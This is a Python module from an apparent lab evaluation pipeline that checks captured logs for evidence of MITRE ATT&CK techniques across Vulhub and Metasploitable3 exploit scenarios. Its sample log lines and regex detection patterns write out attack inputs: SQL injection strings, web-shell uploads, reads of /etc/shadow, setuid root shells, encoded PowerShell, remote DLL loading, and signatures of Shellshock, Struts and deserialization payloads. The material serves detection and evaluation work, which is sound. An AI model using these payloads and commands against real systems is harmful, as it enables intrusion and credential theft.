"""Capture validity — verify a capture actually contains technique-specific
evidence for its declared ground truth, honestly.

Never fabricates or credits missing evidence: a technique with no matching
signal in the real captured telemetry is reported missing, not synthesized.
An earlier version of this module (`enrich_capture`/`get_missing_signals`)
did synthesize plausible-looking signal lines into captures with gaps --
removed 2026-07-24 as unused dead code (no callers anywhere in the codebase)
that also directly contradicted this module's now-current honesty guarantee;
see validate_capture_signals' own docstring for the historical incident that
established never-fabricate as a hard rule here.
"""

from __future__ import annotations

import re

# ── Expected signals per technique ───────────────────────────────────────────
# Each technique maps to (sourcetype, [lines]) that SHOULD be present in the
# capture for the model to have a chance of detecting it.

EXPECTED_SIGNALS: dict[str, tuple[str, list[str]]] = {
    # Credential Access — Kerberoasting
    "T1558.003": (
        "windows:security",
        [
            "EventCode=4769 TicketEncryptionType=0x17 ServiceName=svc_backup Account=administrator@PORTAL.LAB",
            "EventCode=4769 TicketEncryptionType=0x17 ServiceName=svc_sql Account=svc_sql@PORTAL.LAB",
        ],
    ),
    # Credential Access — AS-REP Roasting
    "T1558.004": (
        "windows:security",
        [
            "EventCode=4768 PreAuthType=0 Account=svc_nopreauth@PORTAL.LAB",
            "EventCode=4768 PreAuthType=0 Account=testuser@PORTAL.LAB",
        ],
    ),
    # Credential Access — DCSync
    "T1003.006": (
        "windows:security",
        [
            "EventCode=4662 Account=administrator Properties=Replication-Dir-Replication-Right ObjectClass=domainDNS",
            "EventCode=4662 Account=svc_backup Properties=Replication-Dir-Replication-Right ObjectClass=domainDNS",
        ],
    ),
    # Persistence — Scheduled Task
    "T1053.005": (
        "windows:security",
        [
            "EventCode=4698 TaskName=\\SystemCheck Account=administrator TaskContent=<Exec><Command>cmd.exe</Command><Arguments>/c whoami</Arguments></Exec>",
            "EventCode=7045 ServiceName=SystemUpdate ServiceType=user mode service StartType=auto start ImagePath=cmd.exe /c powershell",
        ],
    ),
    # Credential Access — Password Spraying
    "T1110.003": (
        "windows:security",
        [
            "EventCode=4625 Account=user01 WorkstationName=WKSTN01 IpAddress=10.0.0.50 Status=0xc000006d",
            "EventCode=4625 Account=user02 WorkstationName=WKSTN01 IpAddress=10.0.0.50 Status=0xc000006d",
            "EventCode=4625 Account=user03 WorkstationName=WKSTN01 IpAddress=10.0.0.50 Status=0xc000006d",
            "EventCode=4771 Account=user01 IpAddress=10.0.0.50 PreAuthType=0x0",
        ],
    ),
    # Initial Access — Exploit Public-Facing Application
    "T1190": (
        "web:access",
        [
            '10.0.0.50 POST /login HTTP/1.1 200 "username=admin&password=\' OR 1=1--"',
            "10.0.0.50 GET /api/v1/users?id=1 UNION SELECT username,password FROM users-- HTTP/1.1 200",
            "10.0.0.50 POST /upload HTTP/1.1 200 filename=shell.php Content-Type=application/x-php",
        ],
    ),
    # Execution — Command and Scripting Interpreter (Unix Shell)
    "T1059.004": (
        "linux:auditd",
        [
            "type=EXECVE uid=root exe=/bin/bash a0=bash a1=-c a2=whoami",
            "type=EXECVE uid=root exe=/bin/sh a0=sh a1=-c a2=id",
            "type=EXECVE uid=www-data exe=/bin/bash a0=bash a1=-i",
        ],
    ),
    # Execution — Command and Scripting Interpreter
    "T1059": (
        "windows:security",
        [
            "EventCode=4688 NewProcessName=C:\\Windows\\System32\\cmd.exe Account=SYSTEM Process_Command_Line=cmd.exe /c whoami",
            "EventCode=4688 NewProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Account=SYSTEM Process_Command_Line=powershell.exe -enc SQBFAFgA",
        ],
    ),
    # Lateral Movement — Exploitation of Remote Services
    "T1210": (
        "windows:security",
        [
            "EventCode=4688 NewProcessName=C:\\Windows\\System32\\rundll32.exe Account=SYSTEM Process_Command_Line=rundll32.exe \\\\10.0.0.50\\share\\payload.dll",
            "EventCode=4624 LogonType=3 Account=SYSTEM IpAddress=10.0.0.50",
        ],
    ),
    # Lateral Movement — SMB/Windows Admin Shares
    "T1021.002": (
        "windows:security",
        [
            "EventCode=5140 ShareName=\\\\*\\ADMIN$ Account=administrator IpAddress=10.0.0.50",
            "EventCode=4624 LogonType=3 Account=administrator IpAddress=10.0.0.50 LogonProcessName=NtLmSsp",
        ],
    ),
    # Persistence — Valid Accounts
    "T1078": (
        "windows:security",
        [
            "EventCode=4624 LogonType=10 Account=administrator IpAddress=10.0.0.50 LogonProcessName=User32",
            "EventCode=4648 Account=administrator TargetServer=DC01",
        ],
    ),
    # Privilege Escalation — Setuid and Setgid
    "T1548.001": (
        "linux:auditd",
        [
            "type=EXECVE uid=root exe=/bin/chmod a0=chmod a1=+s a2=/tmp/rootshell",
            "type=EXECVE uid=www-data exe=/bin/bash a0=bash a1=-c a2=find / -perm -4000 2>/dev/null",
        ],
    ),
    # Privilege Escalation — Exploitation for Privilege Escalation
    "T1068": (
        "linux:auditd",
        [
            "type=EXECVE uid=www-data exe=/bin/bash a0=bash a1=-c a2=./exploit",
            "type=EXECVE uid=root exe=/bin/bash a0=bash a1=-c a2=id",
        ],
    ),
    # Discovery — File and Directory Discovery
    "T1083": (
        "linux:auditd",
        [
            "type=EXECVE uid=www-data exe=/usr/bin/find a0=find a1=/ a2=-name a3=*.conf",
            "type=EXECVE uid=www-data exe=/bin/ls a0=ls a1=-la a2=/etc/passwd",
        ],
    ),
    # Persistence — Web Shell
    "T1505.003": (
        "web:access",
        [
            "10.0.0.50 POST /uploads/shell.php HTTP/1.1 200 cmd=whoami",
            "10.0.0.50 GET /uploads/shell.php?cmd=id HTTP/1.1 200",
        ],
    ),
    # Reconnaissance — Active Scanning
    "T1595": (
        "web:access",
        [
            '10.0.0.50 GET / HTTP/1.1 200 "Mozilla/5.0 (Nmap Scripting Engine)"',
            "10.0.0.50 GET /.env HTTP/1.1 404",
            "10.0.0.50 GET /admin HTTP/1.1 200",
        ],
    ),
    # Reconnaissance — Gather Victim Host Information
    "T1592": (
        "linux:auditd",
        [
            "type=EXECVE uid=root exe=/usr/bin/nmap a0=nmap a1=-sV a2=-p- a3=10.0.0.50",
            "type=EXECVE uid=root exe=/usr/bin/nmap a0=nmap a1=-O a2=10.0.0.50",
        ],
    ),
    # Discovery — Network Service Discovery
    "T1046": (
        "linux:auditd",
        [
            "type=EXECVE uid=root exe=/usr/bin/nmap a0=nmap a1=-sS a2=-p a3=1-1000 a4=10.0.0.50",
            "type=EXECVE uid=root exe=/usr/bin/nmap a0=nmap a1=-sV a2=10.0.0.50",
        ],
    ),
    # Credential Access — Unsecured Credentials
    "T1552": (
        "linux:auditd",
        [
            "type=EXECVE uid=www-data exe=/bin/cat a0=cat a1=/etc/shadow",
            "type=EXECVE uid=www-data exe=/usr/bin/find a0=find a1=-name a2=.password*",
        ],
    ),
    # Initial Access — Drive-by Compromise
    "T1189": (
        "web:access",
        [
            "10.0.0.50 GET /exploit-kit/landing.html HTTP/1.1 200",
            "10.0.0.50 GET /payload.exe HTTP/1.1 200",
        ],
    ),
}

# Regex-based ALTERNATIVE evidence per technique, checked with OR logic
# against the EXPECTED_SIGNALS token-match above (either satisfies the
# technique -- see validate_capture_signals). Exists because a MITRE
# technique can be legitimately proven by evidence shapes EXPECTED_SIGNALS'
# single (sourcetype, [literal example lines]) format can't express: exact
# literal substrings can't match a value that legitimately varies (a uid
# number, a session token), and some techniques are provable via more than
# one real evidence channel depending on target OS/exploit class.
#
# Vulhub LXCs cannot own the host-wide Linux audit facility, so command
# execution must also be recognizable through independently captured response
# and packet evidence. Reflected `id` output is strong evidence, but its
# uid/gid values vary and cannot be represented by literal example lines.
ADDITIONAL_SIGNAL_PATTERNS: dict[str, list[str]] = {
    "T1059": [
        # `id` command output reflected into a response/log/packet capture --
        # e.g. "uid=0(root) gid=0(root) groups=0(root)". Effectively unfakeable
        # by coincidental web content; every Class-A scenario's prompt (see
        # exec_chain.py) explicitly runs `id` as its documented verification
        # step. Blind callback-only CVEs are excluded because the lab network
        # cannot reliably reach Docker Desktop published listener ports.
        r"uid=\d+\([\w.-]+\)\s*gid=\d+\([\w.-]+\)",
    ],
}

# Technique evidence is often scenario-specific. A generic T1190 example for
# SQL injection cannot validate an observed Shellshock, Gremlin, or Spring
# data-binding request. These signatures are deliberately scoped by scenario
# so an ordinary request in one capture cannot certify an unrelated exploit.
SCENARIO_SIGNAL_PATTERNS: dict[str, dict[str, list[str]]] = {
    "vuln_activemq_deserial": {
        "T1190": [
            r"(?s)org\.springframework\.context\.support\.ClassPathXmlApplicationContext.*?PORTAL_TARGET_POSTCONDITION:activemq-rce:/tmp/activeMQ-RCE-success"
        ],
        "T1059": [r"PORTAL_TARGET_POSTCONDITION:activemq-rce:/tmp/activeMQ-RCE-success"],
    },
    "vuln_fastjson_rce": {
        "T1190": [
            r"(?s)com\.sun\.rowset\.JdbcRowSetImpl.*?rmi://.*?PORTAL_TARGET_POSTCONDITION:fastjson-rmi-callback"
        ],
    },
    "vuln_weblogic_rce": {
        "T1190": [r"(?s)ldap://.*?PORTAL_TARGET_POSTCONDITION:weblogic-ldap-callback"],
    },
    "vuln_laravel_rce": {
        "T1190": [
            r"(?s)(?:POST|PUT) /_ignition/execute-solution.*?PORTAL_TARGET_POSTCONDITION:laravel-rce:/tmp/portal-laravel-proof"
        ],
        "T1059": [r"PORTAL_TARGET_POSTCONDITION:laravel-rce:/tmp/portal-laravel-proof"],
    },
    "vuln_wordpress_rce": {
        "T1190": [
            r"(?s)/wp-login\.php\?action=lostpassword.*?spool_directory.*?PORTAL_TARGET_POSTCONDITION:wordpress-rce:/tmp/portal-wordpress-proof"
        ],
        "T1059": [r"PORTAL_TARGET_POSTCONDITION:wordpress-rce:/tmp/portal-wordpress-proof"],
    },
    "meta3_phpmyadmin_rce": {
        "T1190": [r"/phpmyadmin/(?:js/messages\.php|index\.php)"],
        "T1078": [r"(?:username|pma_username)(?:=|%3D)root"],
        "T1059": [r"nt authority\\+(?:local service|system)"],
    },
    "meta3_rails_console_rce": {
        "T1190": [r"/missing404", r"web_console"],
        # The bounded Ruby payload executes ``whoami`` on the Windows target.
        # web-console returns the command's stdout in its JSON response, so
        # this is observed execution evidence rather than an attack-ledger
        # assertion. Keep it scenario-scoped to avoid crediting unrelated
        # Windows banners with command execution.
        "T1059": [r"nt authority\\+system"],
    },
    "meta3_rdp_standard_auth": {
        # A protocol-level RDP credential check is captured on both planes:
        # traffic to TCP/3389 and the successful account logon generated by
        # that same bounded episode.  Neither a bare open port nor a generic
        # 4624 is sufficient on its own.
        "T1021.001": [
            r"(?s)(?=.*(?:\.3389|3389:))(?=.*EventCode=4624.*LogonType=(?:10|3).*(?:Account=vagrant|LogonProcessName=(?:User32|NtLmSsp)))"
        ],
        "T1078": [
            r"EventCode=4624.*LogonType=10",
            # impacket-rdp_check performs protocol-level credential validation
            # without opening a desktop; Server 2008 R2 records that bounded
            # validation as a network logon for the documented account.
            r"EventCode=4624.*LogonType=3.*Account=vagrant.*LogonProcessName=NtLmSsp",
        ],
    },
    "vuln_adminer_ssrf_recon": {
        "T1190": [r"auth(?:%5B|\[)driver(?:%5D|\])=elastic"],
        "T1046": [r"10\.10\.11\.21(?::|%3A)(?:5985|31337)"],
    },
    "vuln_ajreport_rce": {"T1190": [r"/dataSetParam/verification;swagger-ui/"]},
    "vuln_docker_api_rce": {"T1190": [r"POST /containers/create"]},
    "vuln_druid_rce": {"T1190": [r"/druid/indexer/v1/sampler"]},
    "vuln_hugegraph_rce": {"T1190": [r"POST /gremlin"]},
    "vuln_jimureport_rce": {"T1190": [r"/jmreport/queryFieldBySql"]},
    "vuln_shellshock_rce": {"T1190": [r"/victim\.cgi", r"User-Agent: \(\) \{ :;\}"]},
    "vuln_spring4shell_rce": {"T1190": [r"class\.module\.classLoader", r"/tomcatwar\.jsp"]},
    "vuln_struts2_rce": {
        # Require the S2-045 sandbox-bypass payload and its correlated command
        # proof in the same bounded capture.  A Struts banner, a generic 200,
        # or the detection-only X-Test header cannot certify exploitation.
        "T1190": [
            r"(?s)(?=.*getExcludedPackageNames\(\)\.clear\(\))(?=.*X-Cmd-Output:\s*uid=\d+\([\w.-]+\)\s*gid=\d+\([\w.-]+\))"
        ]
    },
    "vuln_confluence_rce": {
        "T1190": [r"ServletActionContext.*setHeader.*X-Cmd-Response"],
        "T1059": [r"X-Cmd-Response:\s*uid=\d+\([\w.-]+\)\s*gid=\d+\([\w.-]+\)"],
    },
    "vuln_drupal_rce": {
        # curl --data-urlencode 'mail[#post_render][]=exec' only URL-encodes the
        # VALUE side of a name=value pair; because this string has no bare '='
        # before the payload, curl treats the whole thing as a literal body
        # segment and sends '#' unencoded on the wire (confirmed live 2026-07-31
        # against a real capture: 'mail[#post_render][]=exec', never '%23').
        # The old pattern required %23 unconditionally and could never match a
        # real capture.
        "T1190": [
            r"user/register.*mail(?:%5B|\[)(?:%23|#)post_render(?:%5D|\])(?:%5B|\[)(?:%5D|\])=exec"
        ],
        "T1059": [r"uid=\d+\([\w.-]+\)\s*gid=\d+\([\w.-]+\)"],
    },
    "vuln_solr_rce": {
        "T1190": [
            r"(?s)/solr/.*/config.*params.resource.loader.enabled.*?/solr/.*/select.*v\.template=custom"
        ],
        "T1059": [r"uid=\d+\([\w.-]+\)\s*gid=\d+\([\w.-]+\)"],
    },
    "vuln_grafana_lfi": {
        "T1083": [r"(?s)/public/plugins/alertlist/\.\./.*?/etc/passwd.*?root:x:0:0:"],
        "T1190": [r"(?s)/public/plugins/alertlist/\.\./.*?/etc/passwd.*?root:x:0:0:"],
    },
    "vuln_tomcat_deploy": {
        "T1190": [r"(?s)PUT /portal-proof\.jsp/.*?GET /portal-proof\.jsp.*?uid=\d+\("],
        "T1505.003": [r"(?s)PUT /portal-proof\.jsp/.*?GET /portal-proof\.jsp.*?uid=\d+\("],
        "T1059.004": [r"uid=\d+\([\w.-]+\)\s*gid=\d+\([\w.-]+\)"],
    },
    "vuln_couchdb_rce": {
        "T1190": [
            r'(?s)PUT /_users/org\.couchdb\.user:portalproof.*?"roles":\["_admin"\],"roles":\[\].*?"ok":true'
        ],
        "T1078": [r"(?s)Authorization: Basic .*?GET /_all_dbs.*?_users"],
    },
    "vuln_elasticsearch_rce": {
        "T1190": [
            r"(?s)/_search\?pretty.*?script_fields.*?Runtime\.getRuntime\(\)\.exec.*?uid=\d+\("
        ],
        "T1059": [r"uid=\d+\([\w.-]+\)\s*gid=\d+\([\w.-]+\)"],
    },
    "vuln_redis_unauth": {
        "T1190": [r"(?s)INFO.*?redis_version:.*?CONFIG.*?GET.*?dir"],
    },
    "vuln_nacos_rce": {
        "T1190": [r"(?s)User-Agent: Nacos-Server.*?/nacos/v1/auth/users.*?portalproof"],
        "T1078": [r"(?s)/nacos/v1/auth/users/login.*?nacos.*?(?:accessToken|globalAdmin)"],
    },
    "vuln_gitea_rce": {
        "T1190": [r"(?s)/info/lfs/objects.*?\.\.\.\.\.\./\.\./\.\./etc/passwd.*?root:x:0:0:"],
    },
    "vuln_joomla_rce": {
        "T1190": [r"/api/index\.php/v1/config/application\?public=true"],
        "T1552": [
            r'(?s)/api/index\.php/v1/config/application\?public=true.*?"(?:password|db|user)"'
        ],
    },
    "vuln_nexus_rce": {
        "T1083": [r"(?s)%2F\.\.%2F\.\.%2F.*?etc%2Fpasswd.*?root:x:0:0:"],
        "T1190": [r"(?s)%2F\.\.%2F\.\.%2F.*?etc%2Fpasswd.*?root:x:0:0:"],
    },
    "vuln_django_sqli": {
        "T1190": [
            r"(?s)/\?date=xxxx(?:%27|')xxxx.*?(?:syntax error|ProgrammingError|unterminated)"
        ],
    },
    "vuln_thinkphp_rce": {
        "T1190": [
            r"(?s)POST /index\.php\?s=captcha.*?_method=__construct.*?filter(?:%5B|\[)(?:%5D|\])=system.*?uid=\d+\("
        ],
        "T1059": [r"uid=\d+\([\w.-]+\)\s*gid=\d+\([\w.-]+\)"],
    },
    "vuln_rails_rce": {
        "T1083": [r"(?s)GET /robots.*?Accept: \.\./.*?/etc/passwd\{\{.*?root:x:0:0:"],
        "T1190": [r"(?s)GET /robots.*?Accept: \.\./.*?/etc/passwd\{\{.*?root:x:0:0:"],
    },
    "vuln_phpmyadmin_rce": {
        "T1190": [r"(?s)/index\.php\?target=db_sql\.php%253f/\.\./.*?/etc/passwd.*?root:x:0:0:"],
    },
    "vuln_nginx_lfi": {
        "T1083": [
            r"(?s)Range: bytes=-\d+,-922337203685\d+.*?(?:KEY:|HTTP/1\.[01] 200|Content-Type:)"
        ],
        "T1190": [
            r"(?s)Range: bytes=-\d+,-922337203685\d+.*?(?:KEY:|HTTP/1\.[01] 200|Content-Type:)"
        ],
    },
    "vuln_zabbix_rce": {
        "T1190": [
            r"(?s)/(?:latest|jsrpc)\.php.*?updatexml(?:%28|\()0(?:%2C|,)concat(?:%28|\()0xa(?:%2C|,)(?:user|database|version)(?:%28%29|\(\))(?:%29|\)),0(?:%29|\)).*?(?:XPATH syntax error|root@|zabbix@)"
        ],
    },
    "vuln_spring_actuator": {
        "T1190": [
            r"(?s)selector:T\(java\.lang\.Runtime\)\.getRuntime\(\)\.exec\('touch /tmp/success'\).*?/app/hello"
        ],
        "T1059": [r"PORTAL_TARGET_POSTCONDITION:spring-rce:/tmp/success"],
    },
    "vuln_gitlab_rce": {
        "T1190": [r"(?s)POST /uploads/user.*?AT&TFORM"],
        "T1059": [r"PORTAL_TARGET_POSTCONDITION:gitlab-rce:/tmp/portal-gitlab-proof"],
    },
    "vuln_dubbo_rce": {
        "T1190": [r"POST /org\.vulhub\.api\.CalcService"],
        "T1059": [r"PORTAL_TARGET_POSTCONDITION:dubbo-rce:/tmp/portal-dubbo-proof"],
    },
    "vuln_shiro_deserial": {
        "T1190": [r"Cookie: rememberMe=[A-Za-z0-9+/=]{100,}"],
        "T1059": [r"PORTAL_TARGET_POSTCONDITION:shiro-rce:/tmp/portal-shiro-proof"],
    },
    "vuln_jackson_deserial": {
        "T1190": [r"(?s)POST /exploit.*?TemplatesImpl.*?transletBytecodes"],
        "T1059": [r"PORTAL_TARGET_POSTCONDITION:jackson-rce:/tmp/prove1.txt"],
    },
    # ── Metasploitable3-Windows (meta3) ─────────────────────────────────────
    # meta3's telemetry collector (siem/collect.py, kind="meta3") only pulls
    # Windows Security events over WinRM -- there is no IIS/FTP host-log tail
    # (the docstring mentioning one is aspirational/unimplemented) -- so the
    # only real evidence source for these scenarios is the decoded FTP/SSH/SMB/
    # WinRM/MySQL/SNMP protocol dialogue in network:packet. Patterns below are
    # taken from an actual live capture (2026-08-01), not guessed.
    "meta3_ftp_backdoor": {
        "T1078": [r"(?s)USER vagrant.*?PASS vagrant.*?230 User logged in"],
    },
    "meta3_ssh_brute": {
        "T1110.003": [r"vagrant-2008r2\\vagrant"],
        "T1078": [r"vagrant-2008r2\\vagrant"],
        "T1059": [r"vagrant-2008r2\\vagrant"],
    },
    "meta3_winrm_weakpass": {
        "T1110.003": [r"vagrant-2008[Rr]2\\vagrant:vagrant"],
        "T1021.002": [r"Pwn3d!"],
        "T1078": [r"Pwn3d!"],
    },
    "meta3_smb_exploit": {
        "T1210": [r"Pwn3d!"],
        "T1021.002": [r"Pwn3d!"],
    },
    "meta3_psexec": {
        "T1021.002": [r"Executed command via wmiexec"],
        "T1078": [r"vagrant-2008r2\\vagrant"],
        "T1059": [r"Executed command via wmiexec.*?vagrant-2008r2\\vagrant"],
    },
    "meta3_snmp_enum": {
        "T1592": [r"Windows Version 6\.1"],
        "T1046": [r"(?s)public.*?iso\.3\.6\.1\.2\.1"],
    },
    "meta3_mysql_exploit": {
        "T1078": [r"(?s)5\.5\.20.*?wordpress"],
    },
    "meta3_linux_privesc": {
        "T1078": [r"vagrant-2008r2\\vagrant"],
        "T1059": [
            r"(?s)Executed command \(shell type: powershell\).*?vagrant-2008r2\\vagrant.*?True"
        ],
    },
    "meta3_tomcat_manager": {
        "T1190": [r"(?s)GET /manager/html HTTP/1\.1.*?Tomcat Web Application Manager"],
        "T1078": [r"(?s)GET /manager/html HTTP/1\.1.*?Tomcat Web Application Manager"],
        "T1059": [r"nt authority\\system"],
    },
    "meta3_elasticsearch_rce": {
        "T1190": [r"(?s)script_fields.*?Runtime\.getRuntime\(\)\.exec"],
        "T1059": [r"nt authority"],
    },
    "meta3_jenkins_rce": {
        "T1190": [r"scriptText"],
        "T1059": [r"nt authority"],
    },
    "meta3_webdav_upload": {
        "T1190": [r"PUT /uploads/portalproof\.php HTTP/1\.1"],
        "T1505.003": [r"nt authority"],
    },
    "meta3_wordpress_ninja": {
        # Both techniques rely on the postcondition marker (see capture_recipes.py
        # meta3_wordpress_ninja): msfconsole's real exploit request never
        # appeared in network:packet's capped sample (found live 2026-08-01),
        # unlike the direct-curl recipes, so PORTAL_TARGET_POSTCONDITION is the
        # only reliable evidence channel here for both techniques.
        "T1190": [r"nftmp-[A-Za-z0-9]+\.php", r"PORTAL_TARGET_POSTCONDITION:wordpress-ninja:"],
        "T1059": [r"nt authority"],
    },
    "meta3_full_chain": {
        # T1595/T1078 rely on the postcondition marker (see capture_recipes.py
        # meta3_full_chain) -- nmap's and WinRM's own output fell outside
        # network:packet's capped sample in a combined multi-step command,
        # confirmed live 2026-08-01 (not flaky: reproduced twice).
        "T1595": [r"Elasticsearch REST API", r"PORTAL_TARGET_POSTCONDITION:full-chain:"],
        "T1078": [r"vagrant-2008[Rr]2\\vagrant"],
        "T1059": [r"nt authority"],
        "T1190": [r"(?s)script_fields.*?Runtime\.getRuntime\(\)\.exec"],
    },
    "meta3_iis_http": {
        "T1190": [r"portalproof\.aspx"],
        "T1059": [r"apppool"],
    },
    "meta3_struts_rce": {
        "T1190": [r"(?s)DEFAULT_MEMBER_ACCESS.*?ProcessBuilder"],
        "T1059": [r"nt authority"],
    },
}


def validate_capture_signals(scenario: str, telemetry: dict[str, list[str]]) -> dict:
    """Validate that a capture has TECHNIQUE-SPECIFIC signals for its ground
    truth techniques.

    Returns:
        {valid: bool, coverage: float, found: [str], missing: [str],
         unchecked: [str], techniques_checked: int}

    `coverage` is computed only over the CHECKABLE subset (techniques with an
    `EXPECTED_SIGNALS` entry) — `unchecked` techniques (no entry exists yet)
    are never silently credited as found.  The lower-level signal result keeps
    them separate from real misses; replay eligibility applies the stricter
    rule that every declared scorer label must be checked and found.

    Generic attack words cannot prove a specific technique: a token such as
    "failed" in unrelated FTP telemetry must not satisfy missing SSH or process
    evidence. Downstream replay and ablation consumers rely on this gate to
    certify technique-specific evidence without repeating a live capture.
    """
    try:
        from portal.modules.security.core.exec_chain import SCENARIOS
    except ImportError:
        return {
            "valid": False,
            "coverage": 0.0,
            "found": [],
            "missing": [],
            "unchecked": [],
            "techniques_checked": 0,
        }

    sc = SCENARIOS.get(scenario, {})
    gt = sc.get("detect_ground_truth", [])
    if not gt:
        return {
            "valid": False,
            "coverage": 0.0,
            "found": [],
            "missing": [],
            "unchecked": [],
            "techniques_checked": 0,
        }

    all_existing = " ".join(line for lines in telemetry.values() for line in lines)

    found = []
    missing_techniques = []
    unchecked = []
    for technique in gt:
        expected = EXPECTED_SIGNALS.get(technique)
        extra_patterns = [
            *ADDITIONAL_SIGNAL_PATTERNS.get(technique, []),
            *SCENARIO_SIGNAL_PATTERNS.get(scenario, {}).get(technique, []),
        ]
        if not expected and not extra_patterns:
            unchecked.append(technique)
            continue

        _sourcetype, expected_lines = expected or ("", [])
        # A technique is found only if ONE example line's FULL field set is
        # present (AND within that line's own tokens), not any single token
        # pooled across every example (OR across lines is fine — two example
        # lines are two legitimate variants of the same technique).
        #
        # Match every field from one example line together. Pooling fields
        # across examples lets generic values such as Account=administrator or
        # EventCode=4662 falsely prove an unrelated technique.
        has_signal = False
        for line in expected_lines:
            line_tokens = {tok for tok in line.split() if "=" in tok}
            if line_tokens and all(tok in all_existing for tok in line_tokens):
                has_signal = True
                break
        if not has_signal:
            for pattern in extra_patterns:
                if re.search(pattern, all_existing):
                    has_signal = True
                    break
        if has_signal:
            found.append(technique)
        else:
            missing_techniques.append(technique)

    checked_n = len(found) + len(missing_techniques)
    coverage = len(found) / checked_n if checked_n else 0.0
    return {
        "valid": checked_n > 0 and len(found) == checked_n,
        "coverage": round(coverage, 3),
        "found": found,
        "missing": missing_techniques,
        "unchecked": unchecked,
        "techniques_checked": checked_n,
    }
